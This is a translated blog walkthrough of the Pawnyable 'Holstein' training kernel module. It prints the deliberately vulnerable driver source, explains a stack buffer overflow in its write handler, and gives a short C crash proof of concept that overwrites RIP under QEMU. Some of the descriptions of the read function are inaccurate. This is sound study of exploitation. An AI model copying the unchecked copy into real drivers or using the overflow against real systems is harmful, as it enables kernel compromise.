---
title: "[KERNEL] Holstein Module"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ Holstein https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting [KERNEL] Environment Setting ※ Please let me know if there are any mistakes. We will check and correct it. ※"
date: "2024-06-20"
translation_key: "tistory-2904b5c93deb"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-Holstein-Module"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※****

### Holstein

* * *

[https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting](https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting)

 [\[KERNEL\] Environment Setting

※ If there are any mistakes, please let me know. We will check and correct it. ※ https://lrl.kr/JT5m カーネルexploitへの導入 | PAWNYABLE! It's time to explode!

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-Environment-Setting)

It is a kernel module with a simple vulnerability included in the previously installed example and includes open, read, and write.

We will proceed with the settings that were previously installed.

The kernel module where the vulnerability exists is S99pawnyable.

```
##
## Install driver
##
insmod /root/vuln.ko
mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0
```

Load the module called vuln.ko and mount it with the name holstein.

```
##
## User shell
##
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
echo "[ Holstein v1 (LK01) - Pawnyable ]"
setsid cttyhack setuidgid 0 sh
```

Permissions are set with setuidgid, and if set to 0, it can be run with root privileges.

### Analysis

* * *

full code

See more

#include <linux/module.h>  
#include <linux/kernel.h>  
#include <linux/cdev.h>  
#include <linux/fs.h>  
#include <linux/uaccess.h>  
#include <linux/slab.h>  
  
MODULE\_LICENSE("GPL");  
MODULE\_AUTHOR("ptr-yudai");  
MODULE\_DESCRIPTION("Holstein v1 - Vulnerable Kernel Driver for Pawnyable");  
  
#define DEVICE\_NAME "holstein"  
#define BUFFER\_SIZE 0x400  
  
char \*g\_buf = NULL;  
  
static int module\_open(struct inode \*inode, struct file \*file)  
{  
  printk(KERN\_INFO "module\_open called\\n");  
  
  g\_buf = kmalloc(BUFFER\_SIZE, GFP\_KERNEL);  
  if (!g\_buf) {  
    printk(KERN\_INFO "kmalloc failed");  
    return -ENOMEM;  
  }  
  
  return 0;  
}  
  
static ssize\_t module\_read(struct file \*file,  
                        char \_\_user \*buf, size\_t count,  
                        loff\_t \*f\_pos)  
{  
  char kbuf\[BUFFER\_SIZE\] = { 0 };  
  
  printk(KERN\_INFO "module\_read called\\n");  
  
  memcpy(kbuf, g\_buf, BUFFER\_SIZE);  
  if (\_copy\_to\_user(buf, kbuf, count)) {  
    printk(KERN\_INFO "copy\_to\_user failed\\n");  
    return -EINVAL;  
  }  
  
  return count;  
}  
  
static ssize\_t module\_write(struct file \*file,  
                            const char \_\_user \*buf, size\_t count,  
                            loff\_t \*f\_pos)  
{  
  char kbuf\[BUFFER\_SIZE\] = { 0 };  
  
  printk(KERN\_INFO "module\_write called\\n");  
  
  if (\_copy\_from\_user(kbuf, buf, count)) {  
    printk(KERN\_INFO "copy\_from\_user failed\\n");  
    return -EINVAL;  
  }  
  memcpy(g\_buf, kbuf, BUFFER\_SIZE);  
  
  return count;  
}  
  
static int module\_close(struct inode \*inode, struct file \*file)  
{  
  printk(KERN\_INFO "module\_close called\\n");  
  kfree(g\_buf);  
  return 0;  
}  
  
static struct file\_operations module\_fops =  
  {  
   .owner = THIS\_MODULE,  
   .read = module\_read,  
   .write = module\_write,  
   .open = module\_open,  
   .release = module\_close,  
  };  
  
static dev\_t dev\_id;  
static struct cdev c\_dev;  
  
static int \_\_init module\_initialize(void)  
{  
  if (alloc\_chrdev\_region(&dev\_id, 0, 1, DEVICE\_NAME)) {  
    printk(KERN\_WARNING "Failed to register device\\n");  
    return -EBUSY;  
  }  
  
  cdev\_init(&c\_dev, &module\_fops);  
  c\_dev.owner = THIS\_MODULE;  
  
  if (cdev\_add(&c\_dev, dev\_id, 1)) {  
    printk(KERN\_WARNING "Failed to add cdev\\n");  
    unregister\_chrdev\_region(dev\_id, 1);  
    return -EBUSY;  
  }  
  
  return 0;  
}static void \_\_exit module\_cleanup(void)  
{  
  cdev\_del(&c\_dev);  
  unregister\_chrdev\_region(dev\_id, 1);  
}  
  
module\_init(module\_initialize);  
module\_exit(module\_cleanup);

If you look at the LK01/src/ path, there is a file called vuln.c.

Let's analyze this file because it is the source code for the Holstein module.

```
module_init(module_initialize);
module_exit(module_cleanup);
```

This function is used when executing and terminating each.

```
static int __init module_initialize(void)
{
  if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
    printk(KERN_WARNING "Failed to register device\n");
    return -EBUSY;
  }

  cdev_init(&c_dev, &module_fops);
  c_dev.owner = THIS_MODULE;

  if (cdev_add(&c_dev, dev_id, 1)) {
    printk(KERN_WARNING "Failed to add cdev\n");
    unregister_chrdev_region(dev_id, 1);
    return -EBUSY;
  }

  return 0;
}
```

Allows the /dev/ module to be loaded and manipulated through cdev\_add().

Pass module\_fops as an argument in cdev\_init(). This variable is a function table that is called when there is an operation such as open or write on Holstein.

```
static struct file_operations module_fops =
 {
 .owner = THIS_MODULE,
 .read = module_read,
 .write = module_write,
 .open = module_open,
 .release = module_close,
 };
```

Only four cases are defined: open, read, write, and close.

```
static void __exit module_cleanup(void)
{
 cdev_del(&c_dev);
 unregister_chrdev_region(dev_id, 1);
}
```

Lastly, the module termination function has the functions of unmounting and deleting.

```
static int module_open(struct inode *inode, struct file *file)
{
 printk(KERN_INFO "module_open called\n");

 g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
 if (!g_buf) {
 printk(KERN_INFO "kmalloc failed");
 return -ENOMEM;
 }

 return 0;
}
```

Along with the kernel log that the module has been opened, space of size 0x400 is allocated to the buffer through kmalloc.

```
static int module_close(struct inode *inode, struct file *file)
{
 printk(KERN_INFO "module_close called\n");
 kfree(g_buf);
 return 0;
}
```

Performs processing to free the allocated buffer.

```
static ssize_t module_read(struct file *file,
 char __user *buf, size_t count,
 loff_t *f_pos)
{
 char kbuf[BUFFER_SIZE] = { 0 };

 printk(KERN_INFO "module_read called\n");

 memcpy(kbuf, g_buf, BUFFER_SIZE);
 if (_copy_to_user(buf, kbuf, count)) {
 printk(KERN_INFO "copy_to_user failed\n");
 return -EINVAL;
 }

 return count;
}
```

This corresponds to the function executed when the read syscall is called in the user area.

Copy the buffer in the user area to the buffer in the kernel area through \_copy\_to\_user().

This function is vulnerable to overflow because it does not check the size of the data to be copied.

```
static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  char kbuf[BUFFER_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(g_buf, kbuf, BUFFER_SIZE);

  return count;
}
```

This corresponds to a function that is executed when write syscall is called in the user area.

Enter the value into the buffer in the user area and copy the value to the buffer in the kernel area.

### Vulnerability

* * *

```
static ssize_t module_write(struct file *file,
 const char __user *buf, size_t count,
 loff_t *f_pos)
{
 char kbuf[BUFFER_SIZE] = { 0 };

 printk(KERN_INFO "module_write called\n");

 if (_copy_from_user(kbuf, buf, count)) {
 printk(KERN_INFO "copy_from_user failed\n");
 return -EINVAL;
 }
 memcpy(g_buf, kbuf, BUFFER_SIZE);

 return count;
}
```

In \_copy\_from\_user(), count is taken from the user area. kbuf has a size of 0x400, and if count exceeds this value, a stack buffer overflow vulnerability occurs.

### Crash

* * *

```
#include <stdio.h>
#include <stdlib.h>

int main() {
    int fd = open("/dev/holstein", 2);

    char buf[0x500];
    read(fd, buf, 0x500);
    printf("buf: %s\n", buf);

    memset(buf, 'A', 0x500);
    write(fd, buf, 0x500);

    close(fd);
    return 0;
}
```

```
gcc bof_seg.c -o bof_seg -static
mv bof_seg root
cd root; find . -print0 | cpio -o --null --format=newc --owner=root > ../debugfs.cpio
cd ../
```

You must re-create the cpio file as above and modify the script.

```
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr" \
    -no-reboot \
    -cpu qemu64 \
    -gdb tcp::12345 \
    -smp 1 \
    -monitor /dev/null \
    -initrd debugfs.cpio \
    -net nic,model=virtio \
    -net user
```

![](/assets/images/tistory/tistory-2904b5c93deb/001.png)

When you run it, you can see a crash as shown above.

You can see that the value of the RIP register has been manipulated and a Segment failure has occurred.